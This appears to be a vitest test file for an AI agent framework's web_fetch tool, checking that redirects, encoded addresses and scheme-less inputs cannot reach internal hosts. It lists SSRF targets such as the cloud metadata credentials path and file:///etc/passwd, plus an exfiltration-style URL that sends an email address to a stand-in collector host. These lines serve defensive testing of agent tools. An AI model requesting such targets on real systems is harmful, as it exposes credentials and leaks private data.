// GTM-agents: web_fetch cannot be used for server-side request forgery. Every redirect hop is
// validated like the original URL, so a public page that redirects to a metadata address, a
// loopback or private address, or an internal hostname is refused, and that address is never
// requested. Strings without a scheme are refused rather than repaired.
import { executeToolCall } from "@gtm-agents/core/runtime";
import { createToolRegistry } from "@gtm-agents/core/security";
import { createWebFetchHandler } from "@gtm-agents/core/tools";
import { describe, expect, it } from "vitest";
import { session } from "./helpers.ts";

function redirectingFetch(chain: Record<string, string>): { fetch: typeof fetch; requested: string[] } {
  const requested: string[] = [];
  const impl = (input: RequestInfo | URL) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    requested.push(url);
    const next = chain[url];
    return Promise.resolve(next ? new Response(null, { status: 302, headers: { location: next } }) : new Response("<p>public page</p>", { headers: { "content-type": "text/html" } }));
  };
  return { fetch: impl, requested };
}

const INTERNAL = [
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://127.0.0.1:8787/admin",
  "http://10.0.0.5/",
  "http://[fd00::1]/",
  "http://0x7f000001/",
  "http://2130706433/",
  "http://metadata.internal/",
  "http://localhost/",
  "file:///etc/passwd",
];

describe("web_fetch and redirects", () => {
  it("refuses a redirect to any internal address and never requests it", async () => {
    for (const target of INTERNAL) {
      const f = redirectingFetch({ "https://vendor.example/start": target });
      const deps = { registry: createToolRegistry(), handlers: { web_fetch: createWebFetchHandler({ fetch: f.fetch }) } };
      const result = await executeToolCall(deps, session(), { name: "web_fetch", input: { url: "https://vendor.example/start" } });
      expect(result.status, target).toBe("error");
      expect(f.requested, target).toEqual(["https://vendor.example/start"]);
    }
  });

  it("refuses an internal address reached after several public hops", async () => {
    const f = redirectingFetch({ "https://vendor.example/a": "https://cdn.vendor.example/b", "https://cdn.vendor.example/b": "/c", "https://cdn.vendor.example/c": "http://169.254.169.254/" });
    const deps = { registry: createToolRegistry(), handlers: { web_fetch: createWebFetchHandler({ fetch: f.fetch }) } };
    const result = await executeToolCall(deps, session(), { name: "web_fetch", input: { url: "https://vendor.example/a" } });
    expect(result.status).toBe("error");
    expect(f.requested).not.toContain("http://169.254.169.254/");
  });

  it("refuses internal and scheme-less inputs before any request", async () => {
    const f = redirectingFetch({});
    const deps = { registry: createToolRegistry(), handlers: { web_fetch: createWebFetchHandler({ fetch: f.fetch }) } };
    for (const url of ["http://169.254.169.254/latest", "169.254.169.254/latest", "localhost:8787", "internal-service/admin"]) {
      const result = await executeToolCall(deps, session(), { name: "web_fetch", input: { url } });
      expect(result.status, url).not.toBe("ok");
    }
    expect(f.requested).toEqual([]);
  });

  it("at full taint, refuses a URL that carries an email address out, before any request", async () => {
    const f = redirectingFetch({});
    const deps = { registry: createToolRegistry(), handlers: { web_fetch: createWebFetchHandler({ fetch: f.fetch }) } };
    const result = await executeToolCall(deps, session("full"), { name: "web_fetch", input: { url: "https://collector.example/?who=jane%40acme.example" } });
    expect(result).toMatchObject({ status: "blocked", code: "egress" });
    expect(f.requested).toEqual([]);
  });
});
